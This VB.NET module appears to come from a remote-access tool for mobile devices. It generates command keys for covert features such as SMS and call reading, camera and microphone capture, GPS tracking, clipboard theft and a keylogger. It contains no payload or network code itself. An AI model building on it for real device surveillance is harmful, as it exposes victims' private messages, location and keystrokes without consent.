﻿Module SecurityKey

    Public getinfo As String = Nothing

    Public getCalls As String = Nothing

    Public getSMS As String = Nothing

    Public getContacts As String = Nothing

    Public getCamera As String = Nothing

    Public getfiles As String = Nothing

    Public getCommand As String = Nothing

    Public getGSM As String = Nothing

    Public getGPS As String = Nothing

    Public getUpdate As String = Nothing

    Public down_info As String = Nothing

    Public downByte As String = Nothing

    Public upload_info As String = Nothing

    Public uploadByte As String = Nothing

    Public MicwaveOutByte As String = Nothing

    Public ImageViewer As String = Nothing

    Public Apps As String = Nothing

    Public Account As String = Nothing

    Public Information As String = Nothing

    Public MicwaveinByte As String = Nothing

    Public editor As String = Nothing

    Public SHOT As String = Nothing

    Public Keylogger As String = Nothing

    Public AppsProperties As String = Nothing

    Public acquire As String = Nothing

    Public getClipboard As String = Nothing

    Public KeysClient1 As String = Nothing

    Public KeysClient2 As String = Nothing

    Public KeysClient3 As String = Nothing

    Public KeysClient4 As String = Nothing

    Public KeysClient5 As String = Nothing

    Public KeysClient6 As String = Nothing

    Public KeysClient7 As String = Nothing

    Public KeysClient8 As String = Nothing

    Public KeysClient9 As String = Nothing

    Public KeysClient10 As String = Nothing

    Public KeysClient11 As String = Nothing

    Public KeysGetClient As String = Nothing

    Public resultClient As String = Nothing

    Public Sub Createkeys()

        getinfo = Key()

        getCalls = Key()

        getContacts = Key()

        getCamera = Key()

        getfiles = Key()

        getCommand = Key()

        getGSM = Key()

        getGPS = Key()

        down_info = Key()

        downByte = Key()

        upload_info = Key()

        uploadByte = Key()

        MicwaveOutByte = Key()

        ImageViewer = Key()

        Apps = Key()

        Account = Key()

        Information = Key()

        MicwaveinByte = Key()

        MicwaveinByte = Key()

        editor = Key()

        SHOT = Key()

        getUpdate = Key()

        Keylogger = Key()

        AppsProperties = Key()

        acquire = Key()

        getClipboard = Key()

        ' ثابت
        KeysClient1 = "1"
        KeysClient2 = "2"
        KeysClient3 = "3"
        KeysClient4 = "4"
        KeysClient5 = "5"
        KeysClient6 = "6"
        KeysClient7 = "7" 'استغلال
        KeysClient8 = "8"
        KeysClient9 = "9"
        KeysClient10 = "10"
        KeysClient11 = "11"
        KeysGetClient = "-2"
        resultClient = "-1"
    End Sub

    Private count As Integer
    Private Function Key() As String
        count += 1
        Return CStr(count) & GenRandom(3) & CStr(System.DateTime.Now().Millisecond)
    End Function
    Private Function GenRandom(ByVal Length As Integer) As String
        Dim Output As String = Nothing
        Dim UsedLetters As String = "QAZWSXEDCRFVTGBYHNUJMIKOLP"
        For i = 1 To Length
            Threading.Thread.Sleep(5)
            Dim Rnd As New Random(Now.Millisecond)
            Output &= UsedLetters(Rnd.Next(0, UsedLetters.Length))
        Next
        Return Output
    End Function
End Module
